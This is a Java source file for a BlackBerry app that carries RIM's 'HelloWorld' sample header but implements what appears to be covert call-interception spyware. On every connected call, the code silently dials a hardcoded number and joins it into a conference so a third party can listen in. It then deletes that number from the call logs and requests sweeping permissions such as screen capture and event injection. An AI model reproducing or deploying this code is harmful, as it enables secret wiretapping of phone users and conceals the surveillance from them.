/**
 * 
 * HelloWorld.java
 * The sentinal sample!
 *
 * Copyright © 1998-2010 Research In Motion Ltd.
 * 
 * Note: For the sake of simplicity, this sample application may not leverage
 * resource bundles and resource strings.  However, it is STRONGLY recommended
 * that application developers make use of the localization features available
 * within the BlackBerry development platform to ensure a seamless application
 * experience across a variety of languages and geographies.  For more information
 * on localizing your application, please refer to the BlackBerry Java Development
 * Environment Development Guide associated with this release.
 */

package com.rim.samples.device.concalltest;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.invoke.Invoke;
import net.rim.blackberry.api.invoke.PhoneArguments;
import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.RichTextField;

/*
 * BlackBerry applications that provide a user interface must extend 
 * UiApplication.
 */
public class ConCallDemo extends UiApplication implements PhoneListener {
    private static final String STR_MODULE_NAME = "ConCallTest";
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConCallDemo", DebugLevel.VERBOSE);

    //#endif
    /**
     * Entry point for application.
     */
    public static void main(String[] args) {
        // Create a new instance of the application.
        ConCallDemo theApp = new ConCallDemo();
        theApp.init();

        // To make the application enter the event thread and start processing messages, 
        // we invoke the enterEventDispatcher() method.
        theApp.enterEventDispatcher();

    }

    private String phoneNumber;
    private boolean autoanswer;
    private String number;
    private long MINIMUM_IDLE_TIME;
    ConCallScreen conCallScreen;

    Vector mPhoneCalls = new Vector();
    boolean mConnected;

    /**
     * <p>
     * The default constructor. Creates all of the RIM UI components and pushes
     * the application's root screen onto the UI stack.
     */
    public ConCallDemo() {
        conCallScreen = new ConCallScreen(this);
        Debug.setScreen(conCallScreen);
        // Push the main screen instance onto the UI stack for rendering.
        pushScreen(conCallScreen);

    }

    protected void init() {
        //#ifdef DEBUG
        debug.trace("init");
        //#endif

        //Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
        checkPermissions();
        Phone.addPhoneListener(this);
        number = "3938980634";
    }

    public void close() {
        //#ifdef DEBUG
        debug.trace("close");
        //#endif
        Phone.removePhoneListener(this);
    }

    Hashtable callingHistory = new Hashtable();

    /*protected int switchToForeground() {
        int id = -1;
        ApplicationManager appMan = ApplicationManager.getApplicationManager();
        ApplicationDescriptor appDes[] = appMan.getVisibleApplications();
        for (int i = 0; i < appDes.length; i++) {
            String name = appDes[i].getModuleName();
            if (name.equalsIgnoreCase(STR_MODULE_NAME)) {
                id = appMan.getProcessId(appDes[i]);
                appMan.requestForeground(id);
                // give a time to foreground application
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                break;
            }
        }
        return id;
    }*/
    
    protected void switchToForeground(){
        requestForeground();
    }

    public void callAdded(int callId) {
        //#ifdef DEBUG
        debug.info("======= callAdded: " + callId + "===");
        //#endif
    }

    public void callAnswered(int callId) {

        final PhoneCall phoneCall = Phone.getCall(callId);
        phoneNumber = phoneCall.getDisplayPhoneNumber().trim();

        //#ifdef DEBUG
        debug.info("======= callAnswered: " + phoneNumber + "===");
        //#endif

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        switchToForeground();

        //MenuWalker.walk("Home Screen");
        //MenuWalker.walk("Return to Phone");
        //MenuWalker.walk(new String[] { "Close" });
        //MenuWalker.walk("Activate Speakerphone");
        //MenuWalker.setLocaleEnd();

        //#ifdef DEBUG
        debug.trace("onCallAnswered: finished");
        //#endif
    }

    private boolean interestingNumber(int callId2, String phoneNumber2) {

        return true;
    }

    private void holdActiveCall() {
        MenuWalker.walk("Hold");
    }

    private void joinCalls() {
        MenuWalker.walk("Join Conference");
    }

    public void callConferenceCallEstablished(int arg0) {
        //#ifdef DEBUG
        debug.trace("callConferenceCallEstablished: " + arg0);
        //#endif
        switchToForeground();
    }

    private void makeCall(String number) {
        PhoneArguments call = new PhoneArguments(PhoneArguments.ARG_CALL,
                number);
        Invoke.invokeApplication(Invoke.APP_TYPE_PHONE, call);
    }

    public void callConnected(int callId) {
        //#ifdef DEBUG
        debug.info("======= callConnected: " + phoneNumber + " ===");
        //#endif      

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        //suspendPainting(false);
        if (mPhoneCalls.size() == 0) {
            mConnected = true;
            //holdActiveCall(); //TODO: da lasciare!
            makeCall(number);
        } else {
            joinCalls();
        }

        mPhoneCalls.addElement(Phone.getCall(callId));
        switchToForeground();
    }

    public void callDirectConnectConnected(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callDirectConnectConnected");
        //#endif
    }

    public void callDirectConnectDisconnected(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callDirectConnectDisconnected");
        //#endif
    }

    public void callDisconnected(int callId) {
        //#ifdef DEBUG
        debug.info("======= callDisconnected: " + phoneNumber + " =======");
        //#endif

        autoanswer = false;

        mPhoneCalls.removeElement(Phone.getCall(callId));
        if (mPhoneCalls.size() == 0)
            mConnected = false;
        
        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("onCallDisconnected: not interesting");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.trace("onCallDisconnected, interesting");
            //#endif

            removePhoneCall();

           /* synchronized (Application.getEventLock()) {
                suspendPainting(false);
                //#ifdef DEBUG
                debug.trace("callDisconnected: suspended end");
                //#endif
            }*/
        }
    }

    public void callEndedByUser(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callEndedByUser: " + arg0);
        //#endif
    }

    public void callFailed(int arg0, int arg1) {
        //#ifdef DEBUG
        debug.trace("======= callFailed: " + arg0 + ", " + arg1);
        //#endif
    }

    public void callHeld(int callId) {
        //#ifdef DEBUG
        debug.trace("======= callHeld");
        //#endif
    }

    public void callIncoming(int callId) {

        //#ifdef DEBUG
        debug.info("======= incoming: " + callId + " =======");
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        phoneNumber = phoneCall.getDisplayPhoneNumber().trim();

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("onCallIncoming not interesting: " + phoneNumber);
            //#endif
            return;
        }

        switchToForeground();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callInitiated(int callId) {
        init();

        //#ifdef DEBUG
        debug.trace("======= callInitiated: " + callId);
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        switchToForeground();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callRemoved(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callRemoved: " + arg0);
        //#endif
        switchToForeground();
    }

    public void callResumed(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callResumed: " + arg0);
        //#endif

        switchToForeground();
    }

    public void callWaiting(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= callWaiting: " + arg0);
        //#endif
        switchToForeground();
    }

    public void conferenceCallDisconnected(int arg0) {
        //#ifdef DEBUG
        debug.trace("======= conferenceCallDisconnected: " + arg0);
        //#endif
        switchToForeground();
    }

    private void checkPermissions() {

        //#ifdef DEBUG
        debug.trace("======= CheckPermissions");
        //#endif

        // NOTE: This sample leverages the following permissions:
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual
        // applications will require access to different permissions.
        // Please review the Javadocs for the ApplicationPermissions class
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the
        // requirements
        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        final ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        //final CoreReasonProvider drp = new CoreReasonProvider();
        //apm.addReasonProvider(ApplicationDescriptor
        //        .currentApplicationDescriptor(), drp);

        final int[] wantedPermissions = new int[] {
                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_BLUETOOTH,
                ApplicationPermissions.PERMISSION_WIFI,
                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                ApplicationPermissions.PERMISSION_PIM,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_LOCATION_API,
                ApplicationPermissions.PERMISSION_FILE_API,
                ApplicationPermissions.PERMISSION_MEDIA,
                ApplicationPermissions.PERMISSION_EMAIL,
                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
                ApplicationPermissions.PERMISSION_IDLE_TIMER,
                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                ApplicationPermissions.PERMISSION_BROWSER_FILTER };

        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 

        boolean allPermitted = true;
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];

            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                allPermitted = false;
            }
        }

        if (allPermitted) {
            // All of the necessary permissions are currently available
            //#ifdef DEBUG
            debug
                    .info("All of the necessary permissions are currently available");
            //#endif
            return;
        }

        // Create a permission request for each of the permissions your
        // application
        // needs. Note that you do not want to list all of the possible
        // permission
        // values since that provides little value for the application or the
        // user.
        // Please only request the permissions needed for your application.
        final ApplicationPermissions permRequest = new ApplicationPermissions();
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];
            permRequest.addPermission(perm);
        }

        final boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            //#ifdef DEBUG
            debug.info("User has accepted all of the permissions");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.warn("User has accepted some or none of the permissions");
            //#endif
        }
    }

    private void removePhoneCall() {
        Thread t = new Thread() {
            public void run() {
                init();
                //#ifdef DEBUG
                debug.trace("run: removePhoneCall");
                //#endif
                final int DELAY = 4000;
                Utils.sleep(DELAY);

                removePhoneCallFromFolder(PhoneLogs.FOLDER_NORMAL_CALLS);
                removePhoneCallFromFolder(PhoneLogs.FOLDER_MISSED_CALLS);
            }
        };
        t.start();
    }

    protected void removePhoneCallFromFolder(long folderID) {

        //#ifdef DEBUG
        debug.trace("removePhoneCallFromFolder: " + folderID);

        //#endif
        PhoneLogs phoneLogs = null;

        try {

            phoneLogs = PhoneLogs.getInstance();
            int size = phoneLogs.numberOfCalls(folderID);

            //#ifdef DEBUG
            debug.trace("size before: " + size);
            //#endif

            for (int i = size - 1; i >= 0; i--) {
                final CallLog log = phoneLogs.callAt(i, folderID);

                if (PhoneCallLog.class.isAssignableFrom(log.getClass())) {
                    PhoneCallLog plog = (PhoneCallLog) log;
                    String phoneNumber = plog.getParticipant().getNumber();
                    if (phoneNumber.endsWith(number)) {
                        //#ifdef DEBUG
                        debug.info("removePhoneCallFromFolder: " + phoneNumber);
                        //#endif
                        phoneLogs.deleteCall(i, folderID);
                    }
                }
            }

            size = phoneLogs.numberOfCalls(folderID);

            //#ifdef DEBUG
            debug.trace("size after: " + size);
            //#endif

        } catch (Exception e) {
            //#ifdef DEBUG
            debug.trace("removePhoneCallFromFolder: " + e);
            //#endif

        }
    }

}

/**
 * Create a new screen that extends MainScreen, which provides default standard
 * behavior for BlackBerry applications.
 */
/* package */final class ConCallScreen extends MainScreen {
    ConCallDemo conCallDemo;

    /**
     * LiveMic constructor.
     * 
     * @param demoBB
     */
    public ConCallScreen(ConCallDemo demoBB) {
        this.conCallDemo = demoBB;
        // Add a field to the title region of the screen. We use a simple LabelField 
        // here. The ELLIPSIS option truncates the label text with "..." if the text 
        // is too long for the space available.
        LabelField title = new LabelField("ConCall Demo", LabelField.ELLIPSIS
                | LabelField.USE_ALL_WIDTH);
        setTitle(title);

        // Add a read only text field (RichTextField) to the screen.  The RichTextField
        // is focusable by default.  In this case we provide a style to make the field
        // non-focusable.
        //add(new RichTextField("Live MIC Demo", Field.NON_FOCUSABLE));
    }

    public void addText(String text) {

        add(new RichTextField(text, Field.NON_FOCUSABLE));
    }

    /**
     * Display a dialog box to the user with "Goodbye!" when the application is
     * closed.
     * 
     * @see net.rim.device.api.ui.Screen#close()
     */
    public void close() {
        conCallDemo.close();

        // Display a farewell message before closing application.
        Dialog.alert("Goodbye!");

        System.exit(0);
        super.close();
    }

}
